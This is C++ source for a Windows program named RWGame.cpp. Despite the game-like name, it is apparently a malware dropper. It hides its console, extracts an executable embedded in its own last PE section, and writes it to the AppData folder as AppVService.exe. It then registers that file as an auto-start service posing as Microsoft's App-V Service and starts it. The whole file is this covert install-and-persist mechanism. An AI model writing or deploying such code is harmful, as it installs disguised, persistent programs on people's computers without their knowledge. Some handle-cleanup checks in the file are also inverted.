// RWGame.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include "RWGame.h"


// 不显示控制台
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"wmainCRTStartup\"")

// 存放服务程序将写入的路径
TCHAR	g_szServicePath[MAX_PATH] = {0}; 

#define AS					TEXT("AppVService")
#define AS_Description		TEXT("Microsoft App-V Service")

//////////////////////////////////////////////////////////////////////
// 用户入口
//////////////////////////////////////////////////////////////////////
int _tmain(int argc, _TCHAR* argv[])
{
	LPVOID lpServiceData = NULL;
	DWORD dwSizeOfServiceExe = NULL;

	// 检测是否此程序只运行了一个实例
	CheckIsExsist();
	// 获取服务程序内存指针
	GetServiceDataPointer(&lpServiceData, &dwSizeOfServiceExe);
	// 获取期望的用户路径
	GetMagicPath(g_szServicePath);
	// 将服务写入到目标路径
	WriteMemeryToFile(lpServiceData, dwSizeOfServiceExe, g_szServicePath);
	// 安装服务
	InstallService();
	// 启动服务
	StartSvc();

	return 0;
}

//////////////////////////////////////////////////////////////////////
// 检测是否当前程序仅被启动了一次
// 此内核对象将在程序结束后自动释放
//////////////////////////////////////////////////////////////////////
VOID WINAPI CheckIsExsist(void)
{
	// 值为0则代表是第一次运行
	HANDLE hExeExist = OpenMutex(MUTEX_ALL_ACCESS, FALSE, TEXT("CHECK_EXSIST_WIN32API_FLAG_GAME_SERVICE_NEW"));
	if (!hExeExist)
	{
		// 如果此程序是第一次运行则创建内核对象用作全局标志
		if (!CreateMutex(NULL, FALSE, TEXT("CHECK_EXSIST_WIN32API_FLAG_GAME_SERVICE_NEW")))
		{
			// 创建失败则退出
			_exit(0);
		}
	}
	else
	{
		if (!hExeExist) CloseHandle(hExeExist);
		_exit(0);
	}

	return;
}


//////////////////////////////////////////////////////////////////////
// 对OutPutDebugString进行封装
//////////////////////////////////////////////////////////////////////
VOID WINAPI OutputDebugStringFA(const char* strOutputString, ...)  
{  
    va_list vlArgs = NULL;
	va_start(vlArgs, strOutputString);
    size_t nLen = _vscprintf(strOutputString, vlArgs) + 1;
	char* strBuffer = new char[nLen];
    _vsnprintf_s(strBuffer, nLen, nLen, strOutputString, vlArgs);  
    va_end(vlArgs);  
    OutputDebugStringA(strBuffer);  
    delete[] strBuffer;
    return;
}

VOID WINAPI OutputDebugStringFW(const wchar_t* strOutputString, ...)
{
	va_list vlArgs = NULL;
	va_start(vlArgs, strOutputString);
	size_t nLen = _vscwprintf(strOutputString, vlArgs) + 1;
	wchar_t* strBuffer = new wchar_t[nLen];
	_vsnwprintf_s(strBuffer, nLen, nLen, strOutputString, vlArgs);
	va_end(vlArgs);
	OutputDebugStringW(strBuffer);
	delete[] strBuffer;
	return;
}

//////////////////////////////////////////////////////////////////////
// 获取指定路径
//////////////////////////////////////////////////////////////////////
BOOL GetMagicPath(OUT LPTSTR szPath)
{
	TCHAR szTempCurrentPath[MAX_PATH] = {0};
    PIDLIST_ABSOLUTE lpDLIST;

	// CSIDL_NETHOOD(AppData路径)  // CSIDL_DESKTOP(DeskTop路径) // CSIDL_APPDATA
	HRESULT RESULT = SHGetSpecialFolderLocation(NULL, CSIDL_APPDATA, &lpDLIST);
     if (RESULT == S_OK) 
	 {
		// 如果成功返回RETURN_SUCCESS  
		SHGetPathFromIDList(lpDLIST, szTempCurrentPath);
		// 拼接路径"AppVService"
		swprintf_s(g_szServicePath, MAX_PATH, TEXT("%s\\AppVService.exe"), szTempCurrentPath);

		return RETURN_SUCCESS;
	 }

	return RETURN_ERROR;
}


//////////////////////////////////////////////////////////////////////
// 得到最后一个节数据指针
//////////////////////////////////////////////////////////////////////
BOOL GetServiceDataPointer(OUT LPVOID* lpServiceData, OUT LPDWORD lpdwSizeOfServiceExe)
{
	// 获取服务程序数据位置指针及大小

	// 获取自身的模块句柄
	HANDLE hSelfHandle = ::GetModuleHandle(NULL);
	if (!hSelfHandle) 
	{
		DbgPrint(TEXT("获取自身句柄失败! 错误码:%d"), ::GetLastError());
		return RETURN_ERROR;
	}
	// 定义PE文件结构体指针
	PIMAGE_DOS_HEADER pIMAGE_DOS_HEADER = (IMAGE_DOS_HEADER*)hSelfHandle;
	PIMAGE_NT_HEADERS32 pIMAGE_NT_HEADERS32 = (IMAGE_NT_HEADERS32*)((DWORD)pIMAGE_DOS_HEADER + pIMAGE_DOS_HEADER -> e_lfanew);
	PIMAGE_FILE_HEADER pIMAGE_FILE_HEADER = (IMAGE_FILE_HEADER*)((DWORD)pIMAGE_NT_HEADERS32 + sizeof(pIMAGE_NT_HEADERS32 -> Signature));
	PIMAGE_OPTIONAL_HEADER32 pIMAGE_OPTIONAL_HEADER32 = (IMAGE_OPTIONAL_HEADER32*)((DWORD)pIMAGE_FILE_HEADER + IMAGE_SIZEOF_FILE_HEADER); 
	PIMAGE_SECTION_HEADER pIMAGE_SECTION_HEADER = (IMAGE_SECTION_HEADER*)((DWORD)pIMAGE_OPTIONAL_HEADER32 + pIMAGE_FILE_HEADER -> SizeOfOptionalHeader);
	// 定位到最后一个节
	pIMAGE_SECTION_HEADER += (pIMAGE_FILE_HEADER -> NumberOfSections - 1);
	// 获取最后一个节中数据的大小
	*lpdwSizeOfServiceExe = pIMAGE_SECTION_HEADER -> Misc.VirtualSize;
	// 得到最后一个节的指针
	LPVOID lpServiceExe = (LPVOID)(pIMAGE_SECTION_HEADER -> VirtualAddress + (DWORD)hSelfHandle);
	*lpServiceData = lpServiceExe;

	return RETURN_SUCCESS;
}

//////////////////////////////////////////////////////////////////////
// 从内存写入数据到文件
//////////////////////////////////////////////////////////////////////
BOOL WriteMemeryToFile(IN LPVOID pMemBuffer, IN DWORD SizeOfFile, OUT LPTSTR lpszFile)
{
	// 根据给定的 pMemBuffer 及文件路径和所要写入的文件大小

	FILE* pOpenFile = _tfopen(lpszFile, TEXT("wb"));
	if (!pOpenFile)
	{
		// 返回空指针表明文件打开出现错误
		return RETURN_ERROR;
	}
	// 调整文件指针至文件开头
	fseek(pOpenFile, 0, SEEK_SET);
	// 将内存中的数据写入到指定硬盘路径
	DWORD SizeOfWriteDate = fwrite(pMemBuffer, sizeof(CHAR), sizeof(CHAR) * SizeOfFile, pOpenFile);
	if (SizeOfWriteDate != SizeOfFile)
	{
		return RETURN_ERROR;
	}
	// 关闭文件管道
	DWORD FileCloseReturnValue = fclose(pOpenFile);
	if (FileCloseReturnValue)
	{
		return RETURN_ERROR;
	} 
	return RETURN_SUCCESS;
}

//////////////////////////////////////////////////////////////////////
// 将写入的数据注册为服务
//////////////////////////////////////////////////////////////////////
BOOL InstallService(void)
{
	// 安装/创建服务

	int nRet = RETURN_ERROR;									// 返回值初始化为RETURN_ERROR
	SC_HANDLE				schSCManager = NULL;				// 指定服务控制管理器数据库的句柄
	SC_HANDLE				schService = NULL;					// 服务的句柄
	SERVICE_DESCRIPTION		SDescription = {0};					// 用于显示服务描述的结构体

	// 打开服务管理数据库
	schSCManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if (!schSCManager) goto EXIT;

	// 创建服务
	schService = CreateService(
		schSCManager, 
		AS, 
		AS_Description, 
		SC_MANAGER_ALL_ACCESS, 
		SERVICE_WIN32_OWN_PROCESS, 
		SERVICE_AUTO_START, 
		SERVICE_ERROR_IGNORE, 
		g_szServicePath, 
		NULL, 
		NULL, 
		NULL, 
		NULL, 
		NULL);
	if (!schService) goto EXIT;

	// 在服务管理器中显示的服务的描述
	SDescription.lpDescription = TEXT("Manages App-V users and virtual applications");
	BOOL bSuccess = ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &SDescription);
	if (bSuccess) nRet = RETURN_SUCCESS;

EXIT:
	if (!schSCManager) CloseServiceHandle(schSCManager);
	if (!schService) CloseServiceHandle(schService);

	return nRet;
}

//////////////////////////////////////////////////////////////////////
// 启动服务
//////////////////////////////////////////////////////////////////////
BOOL StartSvc(void)
{
	// 启动服务

	int nRet = RETURN_ERROR;							// 返回值初始化为RETURN_ERROR
	SC_HANDLE		schSCManager = NULL;				// 指定服务控制管理器数据库的句柄
	SC_HANDLE		schService = NULL;					// 服务的句柄
	
	// 打开服务管理数据库
	schSCManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if (!schSCManager) goto EXIT;

	// 打开服务
	schService = OpenService(schSCManager, AS, SERVICE_ALL_ACCESS);
	if (!schService)
	{
		nRet = -2;
		goto EXIT;
	}

	// 服务启动
	if (!StartService(schService, 0, NULL)) 
	{
		nRet = ::GetLastError();
	} 
	else 
	{
		nRet = RETURN_SUCCESS;
	}

EXIT:
	if (!schSCManager) CloseServiceHandle(schSCManager);
	if (!schService) CloseServiceHandle(schService);

	return nRet;
}